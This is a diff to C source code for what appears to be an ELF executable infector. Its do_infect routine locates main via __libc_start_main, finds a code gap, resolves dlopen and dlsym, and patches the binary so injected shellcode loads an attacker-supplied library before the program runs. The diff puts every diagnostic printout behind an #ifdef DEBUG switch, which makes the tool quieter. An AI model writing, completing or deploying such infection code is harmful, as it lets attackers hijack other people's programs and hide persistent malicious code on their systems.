@@ -11,6 +11,8 @@
 #include <sys/stat.h>
 #include <string.h>
 
+#define DEBUG	// allows printouts
+
 // elf header defs
 #define ELF_HEAD_TYPE_OFFSET		0x04
 #define ELF_HEAD_ENTRY_OFFSET		0x18
@@ -427,44 +429,61 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	// open and map target
 	tfd = open_and_map(target_path, &tdata, &tdata_len);
 	if (tfd == -1) {
+#ifdef DEBUG
 		printf("Couldn't open and map\n");
+#endif
 		return -1;
 	}
 
 	// find original main
 	// it will be an argument to __libc_start_main
 	if (find_arg_main(tdata, &arg_main)) {
+#ifdef DEBUG
 		printf("Couldn't find main as an arg\n");
+#endif
 		close(tfd);
 		return -1;
 	}
 	
+#ifdef DEBUG
 	printf("Found main at %016lx, with rip %016lx\n", (uint64_t)arg_main.main_addr, (uint64_t)arg_main.rip);
+#endif
 
 	// find area for our new main
 	if (find_gap(tdata, &pad_area)) {
+#ifdef DEBUG
 		printf("Couldn't find a gap\n");
+#endif
 		return -1;
 	}
+#ifdef DEBUG
 	printf("foff = %lx, vaddr = %lx, len = %lx\n", pad_area.fileoffset, pad_area.vaddr, pad_area.size);
+#endif
 
 	// get the needed symbols
 	if (find_plt(tdata, "dlopen", &dlopen_plt)) {
+#ifdef DEBUG
 		printf("Couldn't find dlopen!\n");
+#endif
 		return -1;
 	}
-	printf("Found dlopen at %lx\n", dlopen_plt.vaddr);
 	if (find_plt(tdata, "dlsym", &dlsym_plt)) {
+#ifdef DEBUG
 		printf("Couldn't find dlsym!\n");
+#endif
 		return -1;
 	}
-	printf("Found dlsym at %lx\n", dlsym_plt.vaddr);
 
-	// test the shellcode size
+#ifdef DEBUG
+	printf("Found dlsym at %lx\n", dlsym_plt.vaddr);
 	printf("Shellcode start %p end %p size = %ld\n", &SH_CODE_START, &SH_CODE_END, (&SH_CODE_END - &SH_CODE_START));
+#endif
 	
+	// test the shellcode size
 	if (((&SH_CODE_END - &SH_CODE_START) + 0x18 + strlen(lib_path) + strlen(exported_func)) > pad_area.size) {
+#ifdef DEBUG
 		printf("The payload is too big\n");
+#endif
 		return -1;
 	}
 	
@@ -498,14 +517,18 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 	if (arg_main.rip == NULL) {
 		// absolute addressing
 		if (arg_main.addr_size != 4) {
+#ifdef DEBUG
 			printf("unsupported size\n");
+#endif
 			return -1;
 		}
 		*((uint32_t*)arg_main.file_ptr) = (uint32_t)pad_area.vaddr;
 	} else {
 		// needs to be offset from rip
 		if (arg_main.addr_size != 4) {
+#ifdef DEBUG
 			printf("unsupported size\n");
+#endif
 			return -1;
 		}
 		*((uint32_t*)arg_main.file_ptr) = ((int32_t)pad_area.vaddr) - ((int32_t)(uint64_t)arg_main.rip);
@@ -513,7 +536,9 @@ int do_infect(char* target_path, char* lib_path, char* exported_func) {
 
 	// cleanup	
 	if (unmap_and_close(tfd, tdata, tdata_len)) {
+#ifdef DEBUG
 		printf("Could not close correctly!\n");
+#endif
 		return -1;
 	}
 
